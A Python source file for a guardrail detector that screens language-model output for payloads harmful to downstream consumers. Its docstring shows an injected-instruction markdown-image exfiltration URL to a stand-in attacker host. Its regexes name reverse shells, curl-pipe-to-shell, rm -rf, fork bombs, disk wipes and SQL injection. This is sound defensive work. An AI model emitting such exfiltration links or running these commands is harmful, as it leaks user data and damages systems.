"""Improper output handling (OWASP LLM05).

Model output is attacker-influenced data. When an application renders it as
HTML or markdown, pipes it into a shell, or splices it into SQL, the model has
become an injection vector into *those* systems. The classic LLM-specific case
is **markdown image exfiltration**: an injected instruction makes the model
emit ``![](https://attacker.example/p?d=<conversation data>)``, and the
client's markdown renderer silently fetches it — no click needed.

This detector screens responses for content that is dangerous *to the
consumer of the output*, not to the model:

* ``markdown_exfil`` — images/links whose URL carries a query string or long
  path segment to a host outside ``allowed_domains``. Blocks by default.
* ``active_html`` — ``<script>``, ``<iframe>``, inline event handlers,
  ``javascript:`` URIs.
* ``shell_payload`` — destructive or remote-execution shell idioms.
* ``sql_payload`` — destructive SQL and tautology injections.

The last two flag rather than block by default: a coding assistant legitimately
explains ``rm -rf``. Unless the application declares ``executes_output``, their
score is capped below the risk matrix's second likelihood step — the construct
is present, but nothing will run it, so the evidence of an actual LLM05 exploit
is weak. With ``executes_output: true`` they score high and block. Spans are exact, so ``redact`` is available as an action and
replaces only the offending construct.
"""

from __future__ import annotations

import re
from collections.abc import Sequence
from urllib.parse import urlparse

from ..config import DetectorConfig
from ..types import Action, Finding, Severity, Span, Stage
from .base import Detector, DetectorInput, detector

_MD_URL = re.compile(r"!?\[[^\]\n]{0,200}\]\(\s*<?(https?://[^\s)>]+)>?(?:\s+\"[^\"]*\")?\s*\)", re.IGNORECASE)
_HTML_IMG = re.compile(r"<img\b[^>]*\bsrc\s*=\s*[\"']?(https?://[^\s\"'>]+)", re.IGNORECASE)

_ACTIVE_HTML = (
    ("script_tag", re.compile(r"<\s*script\b", re.IGNORECASE), 0.85),
    ("iframe_tag", re.compile(r"<\s*(?:iframe|object|embed)\b", re.IGNORECASE), 0.7),
    ("event_handler", re.compile(r"<[^>]+\bon(?:error|load|click|mouseover|focus)\s*=", re.IGNORECASE), 0.8),
    ("javascript_uri", re.compile(r"(?:href|src)\s*=\s*[\"']?\s*javascript:", re.IGNORECASE), 0.8),
)

_SHELL = (
    ("rm_root", re.compile(r"\brm\s+-(?:[a-z]*r[a-z]*f|[a-z]*f[a-z]*r)[a-z]*\s+(?:/|~|\*|\$HOME)(?:\s|$)", re.IGNORECASE), 0.6),
    ("pipe_to_shell", re.compile(r"\b(?:curl|wget|iwr|Invoke-WebRequest)\b[^\n|]{0,200}\|\s*(?:sudo\s+)?(?:ba|z|)sh\b", re.IGNORECASE), 0.6),
    ("reverse_shell", re.compile(r"(?:/dev/tcp/|\bnc\b[^\n]{0,40}\s-e\s|\bbash\s+-i\s+>&)", re.IGNORECASE), 0.75),
    ("fork_bomb", re.compile(r":\(\)\s*\{\s*:\|:&\s*\};:"), 0.6),
    ("disk_wipe", re.compile(r"\b(?:mkfs(?:\.\w+)?\s+/dev/|dd\s+if=/dev/(?:zero|random)\s+of=/dev/)", re.IGNORECASE), 0.6),
)

_SQL = (
    ("sql_drop", re.compile(r"\b(?:drop\s+(?:table|database|schema)|truncate\s+table)\b", re.IGNORECASE), 0.45),
    ("sql_tautology", re.compile(r"'\s*(?:or|OR)\s+'?\d+'?\s*=\s*'?\d+|'\s*;\s*--", re.IGNORECASE), 0.5),
    ("sql_union", re.compile(r"\bunion\s+(?:all\s+)?select\b", re.IGNORECASE), 0.35),
)


@detector("unsafe_output")
class UnsafeOutputDetector(Detector):
    """Screens model output for payloads that attack whatever consumes it."""

    stages = (Stage.OUTPUT, Stage.STREAM)
    category = "improper_output"
    mutates = True

    def __init__(self, config: DetectorConfig | None = None) -> None:
        super().__init__(config)
        opts = self.config.options
        self.threshold = float(self.config.threshold or 0.6)
        self.allowed_domains: tuple[str, ...] = tuple(d.lower().lstrip(".") for d in opts.get("allowed_domains", ()))
        self.check_shell: bool = bool(opts.get("shell", True))
        self.check_sql: bool = bool(opts.get("sql", True))
        #: When the application executes output (agents, code runners), shell
        #: and SQL payloads are as serious as active HTML.
        self.executes_output: bool = bool(opts.get("executes_output", False))

    def _allowed(self, host: str) -> bool:
        host = host.lower()
        return any(host == d or host.endswith("." + d) for d in self.allowed_domains)

    def _exfil(self, text: str) -> list[tuple[Span, float, str]]:
        out: list[tuple[Span, float, str]] = []
        for regex in (_MD_URL, _HTML_IMG):
            for m in regex.finditer(text):
                url = m.group(1)
                parsed = urlparse(url)
                if not parsed.hostname or self._allowed(parsed.hostname):
                    continue
                is_image = m.group(0).startswith("!") or m.group(0).lower().startswith("<img")
                long_segment = any(len(seg) > 64 for seg in parsed.path.split("/"))
                if parsed.query or long_segment:
                    weight = 0.9 if is_image else 0.55
                    out.append((Span(m.start(), m.end(), "markdown_exfil", snippet=url[:120]), weight, parsed.hostname))
        return out

    def detect(self, data: DetectorInput) -> Finding:
        text = data.payload
        spans: list[Span] = []
        signals: list[dict[str, object]] = []
        score = 0.0

        for span, weight, host in self._exfil(text):
            spans.append(span)
            signals.append({"id": "markdown_exfil", "weight": weight, "host": host})
            score = max(score, weight)

        for sid, regex, weight in _ACTIVE_HTML:
            m = regex.search(text)
            if m:
                spans.append(Span(m.start(), m.end(), sid, snippet=m.group()[:80]))
                signals.append({"id": sid, "weight": weight})
                score = max(score, weight)

        boost = 0.25 if self.executes_output else 0.0
        inert_cap = 0.34  # below the default L2 cut: recorded, not escalated
        groups: list[tuple] = []
        if self.check_shell:
            groups.append(_SHELL)
        if self.check_sql:
            groups.append(_SQL)
        for group in groups:
            for sid, regex, weight in group:
                m = regex.search(text)
                if m:
                    w = min(1.0, weight + boost) if self.executes_output else min(weight, inert_cap)
                    spans.append(Span(m.start(), m.end(), sid, snippet=m.group()[:80]))
                    signals.append({"id": sid, "weight": w})
                    score = max(score, w)

        if not signals:
            return self.clean("no unsafe output constructs")
        ids = sorted({str(s["id"]) for s in signals})
        evidence = {"signals": signals, "executes_output": self.executes_output}
        if any(s["id"] in ("reverse_shell", "pipe_to_shell") for s in signals) or self.executes_output:
            evidence["threats"] = ["ASI05"]
        if score >= self.threshold:
            return self.hit(
                score,
                f"response contains content unsafe for downstream handling ({', '.join(ids)})",
                severity=Severity.HIGH if score >= 0.8 else Severity.MEDIUM,
                action=Action.BLOCK,
                spans=spans,
                **evidence,
            )
        return self.hit(
            score,
            f"response contains potentially unsafe constructs ({', '.join(ids)})",
            severity=Severity.LOW,
            action=Action.FLAG,
            spans=spans,
            **evidence,
        )


def exfil_hosts(text: str, allowed: Sequence[str] = ()) -> list[str]:
    """Hosts that ``text`` would contact if rendered as markdown (helper for tests/tools)."""
    det = UnsafeOutputDetector(DetectorConfig(options={"allowed_domains": list(allowed)}))
    return [host for _span, _w, host in det._exfil(text)]
